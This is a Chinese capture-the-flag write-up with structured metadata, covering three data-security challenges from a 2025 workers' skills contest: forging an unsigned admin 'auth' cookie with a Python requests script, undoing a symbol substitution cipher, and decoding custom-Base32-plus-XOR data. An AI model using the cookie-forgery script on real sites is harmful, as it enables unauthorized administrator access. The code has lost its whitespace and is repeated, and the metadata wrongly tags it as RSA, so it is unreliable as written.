---
title: 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp
contest: 职工数字化应用技术技能大赛
year: 2025
difficulty: easy
vuln_type: crypto_rsa
tags:
- 数据安全
- Cookie伪造
- URL编码
- 符号替代
- Base32魔改
- XOR
- key循环
attack_chain: '数据泄露: 伪造auth cookie username=administrator&date=UTC时间戳+URL编码→访问index.php|数据混淆: 符号替代(!→1,@→2,#→3,$→4,%→5,^→6,&→7,*→8,(→9,)→0)→|数据脱敏: 自定义Base32字母表FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX+首字节^0x33+其余字节循环XOR key=37704cf0(8字节)→取第12行第2列'
key_payload: 'cookie_value=quote_plus(''username=administrator&date=2025-11-XX+0000&'')|FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX|unxor: res[0] ^= 0x33; for i in range(1,len): res[i] ^= key[i & 7]'
one_liner: 3道数据安全题,11名成绩,涵盖cookie伪造(username+date+URL编码)+符号替代密码表(!→1..)→0)+自定义Base32(32字母表)解码+首字节^0x33+8字节循环XOR key(37704cf0)
lesson: 1) 服务端可能只验证cookie中username+date而不验证签名,直接quote_plus伪造; 2) 符号替代密码本质是字符替换,优先级!@#$%^&*()对应1234567890; 3) 自定义Base32字母表(FNT5...)要识别反查索引; 4) XOR解密三层:首字节单值^0x33+其余循环XOR 8字节key; 5) 完整文件解密后需定位行+列(本例第12行第2列=865975201629227428)
quality: medium
full_path: 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp.full.md
meta_path: 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp.meta.md
images_removed: true
images_removed_count: 4
schema_version: v3.0.0-P0
summary: 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp。3道数据安全题,11名成绩,涵盖cookie伪造(username+date+URL编码)+符号替代密码表(!→1..)→0)+自定义Base32(32字母表)解码+首字节^0x33+8字节循环XOR key(37704cf0)。经验：1) 服务端可能只验证cookie中username+date而不验证签名,直...
category: crypto
subcategory: rsa
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 4
last_verified: 2026-09-20
contest_type: industry
wp_url: https://www.ctfiot.com/281761.html
reasoning_chain:
- 数据泄露题 → 触发点：服务端 cookie 仅验证 username+date → 假设：直接 quote_plus 伪造
- 动作：cookie_value='username=administrator&date=2025-11-XX+0000&' → quote_plus → 访问 index.php
- 数据混淆题 → 触发点：符号替代密码 !@#$%^&*() 对应 1234567890 → 动作：还原符号替换
- 数据脱敏题 → 触发点：自定义 Base32 字母表 FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX
- 动作：自定义 Base32 解码 → 首字节 ^= 0x33 → 剩余字节循环 XOR key=37704cf0 (8 字节)
- 观察：解密后取第 12 行第 2 列 = 865975201629227428
failed_attempts:
- 直接 quote_plus('administrator') → 失败：必须完整 username=administrator&date=... 格式
- 标准 Base32 解码 → 失败：必须用自定义字母表 FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX
key_observations:
- 服务端可能仅验证 cookie 中 username+date 而不验证签名
- 符号替代密码本质是字符替换，优先级 !@#$%^&*() 对应 1234567890
- 自定义 Base32 字母表（FNT5...）要识别反查索引
- XOR 解密三层：首字节单值 ^0x33 + 其余循环 XOR 8 字节 key
- 完整文件解密后需定位行+列（第 12 行第 2 列）
prerequisites:
- cookie 伪造 + URL 编码
- 符号替代密码识别
- 自定义 Base32 字母表识别
- XOR 多层解密（首字节 + 循环 key）
---
# 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp

> 原文: https://www.ctfiot.com/281761.html
> ID: 281761

点击上方蓝字·关注我们

前言：

第一次参加已职工身份参加线上比武记录下

本次排名总成绩11，不知道前面的wp没写的会不会ban！

csdn主页：https://blog.csdn.net/Aluxian_?type=lately

一、数据安全：

1.数据泄露：

这个题修改cookie其实是省赛原题，也可以写代码

fromdatetimeimportdatetime, timezonefromurllib.parseimportquote_plusimportrequestsdefutc_stamp_for_cookie(dt: datetime |None=None) ->str: ifdtisNone: dt = datetime.now(timezone.utc) returndt.strftime("%Y-%m-%dT%H:%M:%S+0000")defbuild_cookie_value(user:
str) ->str: date_str = utc_stamp_for_cookie() raw =f"username={user}&date={date_str}&" returnquote_plus(raw)defsend_request(): url ="http://106.14.104.133:
32936/index.php" cookie_value = build_cookie_value("administrator") cookies = {"auth": cookie_value} headers = { "User-Agent":"Cookie-Test/1.0", "Accept":"*/*", } withrequests.Session()assess: resp = sess.get(url, headers=headers, cookies=cookies, timeout=10) print("Status:", resp.status_code) print("Sent-Cookie auth=", cookies["auth"]) print("Body preview:", resp.text)if__name__ =="__main__": send_request()

flag{5956462019654412}

3.数据混淆：

! →1，@ →2，# → 3，$ → 4，% → 5，^ →6，& →7，* →8，( →9，) →0

flag{622622591307890225}

4.数据脱敏：

byte_4020C0="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"

frompathlibimportPathalphabet ="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"table = {c: ifori, cinenumerate(alphabet)}defb32_custom_decode(s:
str) ->bytes: s = s.strip().replace("r","").replace("n","") bits =0 bitlen =0 out =bytearray() forchins: ifch =="=": break v = table[ch] bits = (bits <<5) | v bitlen +=5 whilebitlen >=8: bitlen -=8 out.append((bits >> bitlen) &0xFF) returnbytes(out)defunxor(data:
bytes) ->bytes: ifnotdata: returndata key =b"37704cf0" res =bytearray(data) res[0] ^=0x33 foriinrange(1,len(res)): res[i] ^= key[i &7] returnbytes(res)
# 解密整文件p = Path("/mnt/data/info_94e0682.ori.en")lines_decoded = []withp.open("r", encoding="utf-8", errors="ignore")asf: forlineinf: enc = line.strip() xored = b32_custom_decode(enc) plain = unxor(xored) try: text = plain.decode("utf-8") exceptUnicodeDecodeError: text = plain.decode("latin1") lines_decoded.append(text)
# 取第 12 行与第 2 列（按空白/逗号分列）importreline12 = lines_decoded[11]cols = [cforcinre.split(r"[,t| ]+", line12)ifc]print("Line 12:", line12)print("Col 2 :", cols[1])

第12行明文：25813085410865975201629227428a7d1979@b9.com第12行第2列为：865975201629227428

flag{865975201629227428}

5.数据脱敏：


```
fromdatetimeimportdatetime, timezonefromurllib.parseimportquote_plusimportrequestsdefutc_stamp_for_cookie(dt: datetime |None=None) ->str: ifdtisNone: dt = datetime.now(timezone.utc) returndt.strftime("%Y-%m-%dT%H:%M:%S+0000")defbuild_cookie_value(user:
str) ->str: date_str = utc_stamp_for_cookie() raw =f"username={user}&date={date_str}&" returnquote_plus(raw)defsend_request(): url ="http://106.14.104.133:
32936/index.php" cookie_value = build_cookie_value("administrator") cookies = {"auth": cookie_value} headers = { "User-Agent":"Cookie-Test/1.0", "Accept":"*/*", } withrequests.Session()assess: resp = sess.get(url, headers=headers, cookies=cookies, timeout=10) print("Status:", resp.status_code) print("Sent-Cookie auth=", cookies["auth"]) print("Body preview:", resp.text)if__name__ =="__main__": send_request()
! →1，@ →2，# → 3，$ → 4，% → 5，^ →6，& →7，* →8，( →9，) →0
byte_4020C0="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"
frompathlibimportPathalphabet ="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"table = {c: ifori, cinenumerate(alphabet)}defb32_custom_decode(s:
str) ->bytes: s = s.strip().replace("r","").replace("n","") bits =0 bitlen =0 out =bytearray() forchins: ifch =="=": break v = table[ch] bits = (bits <<5) | v bitlen +=5 whilebitlen >=8: bitlen -=8 out.append((bits >> bitlen) &0xFF) returnbytes(out)defunxor(data:
bytes) ->bytes: ifnotdata: returndata key =b"37704cf0" res =bytearray(data) res[0] ^=0x33 foriinrange(1,len(res)): res[i] ^= key[i &7] returnbytes(res)
# 解密整文件p = Path("/mnt/data/info_94e0682.ori.en")lines_decoded = []withp.open("r", encoding="utf-8", errors="ignore")asf: forlineinf: enc = line.strip() xored = b32_custom_decode(enc) plain = unxor(xored) try: text = plain.decode("utf-8") exceptUnicodeDecodeError: text = plain.decode("latin1") lines_decoded.append(text)
# 取第 12 行与第 2 列（按空白/逗号分列）importreline12 = lines_decoded[11]cols = [cforcinre.split(r"[,t| ]+", line12)ifc]print("Line 12:", line12)print("Col 2 :", cols[1])
第12行明文：25813085410865975201629227428a7d1979@b9.com第12行第2列为：865975201629227428
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]